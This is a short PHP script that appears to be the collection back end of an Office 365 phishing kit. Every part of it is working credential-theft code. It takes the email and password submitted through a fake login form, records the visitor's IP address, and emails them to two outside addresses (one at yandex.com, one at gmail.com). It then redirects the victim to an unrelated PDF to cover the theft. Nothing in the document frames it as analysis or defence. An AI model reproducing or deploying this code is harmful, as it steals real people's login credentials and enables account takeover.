<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || office 365 coinbxe log GOD 1ST SON || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="
winn3rstar@yandex.com,
tedcfallsmechanical@gmail.com";
$subject = "tare other mail | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://openknowledge.worldbank.org/bitstream/handle/10986/25697/9781464809941.pdf");
?>